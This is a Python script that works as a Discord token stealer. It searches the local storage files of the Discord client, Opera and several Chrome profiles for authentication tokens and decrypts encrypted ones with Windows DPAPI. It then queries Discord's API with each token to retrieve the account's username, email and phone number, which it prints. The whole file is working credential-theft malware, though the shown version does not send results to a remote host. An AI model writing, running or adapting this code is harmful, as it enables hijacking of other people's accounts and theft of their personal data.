import base64
import json
import os
import re

import requests
from win32crypt import CryptUnprotectData


class TokenExtractor:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []
        self.decrypted_token = ""
        self.decrypted_email = ""
        self.decrypted_phone = ""
        self.decrypted_username = ""

    def extract(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        }

        for platform, path in paths.items():
            if os.path.exists(path):
                tokens = self.get_tokens(path)
                self.tokens.extend(tokens)
                self.uids.extend([platform] * len(tokens))

    def get_tokens(self, path):
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            with open(f'{path}\\{file_name}', 'r', errors='ignore') as file:
                content = file.read()
                matches = re.findall(self.regexp, content)
                enc_matches = re.findall(self.regexp_enc, content)

                for match in matches:
                    tokens.append(match)

                for enc_match in enc_matches:
                    enc_match = enc_match.split(':')[1]
                    decrypted = self.decrypt(enc_match)

                    if decrypted:
                        tokens.append(decrypted)

        return tokens

    def decrypt(self, enc_match):
        try:
            encrypted_bytes = base64.b64decode(enc_match)
            decrypted = CryptUnprotectData(encrypted_bytes, None, None, None, 0)[1].decode()
            return decrypted
        except Exception:
            return ""

    def upload(self):
        if self.tokens:
            for token, uid in zip(self.tokens, self.uids):
                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
                response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                if response.status_code == 200:
                    json_response = json.loads(response.content)
                    username = json_response.get('username')
                    email = json_response.get('email')
                    phone = json_response.get('phone')

                    if username:
                        self.decrypted_username = username

                    if email:
                        self.decrypted_email = email

                    if phone:
                        self.decrypted_phone = phone

                    self.decrypted_token = token

        return self.decrypted_username, self.decrypted_email, self.decrypted_phone, self.decrypted_token


if __name__ == '__main__':
    extractor = TokenExtractor()
    extractor.extract()
    username, email, phone, token = extractor.upload()
    print(f"Decrypted Token: {token}")
    print(f"Decrypted Email: {email}")
    print(f"Decrypted Phone: {phone}")
    print(f"Decrypted Username: {username}")
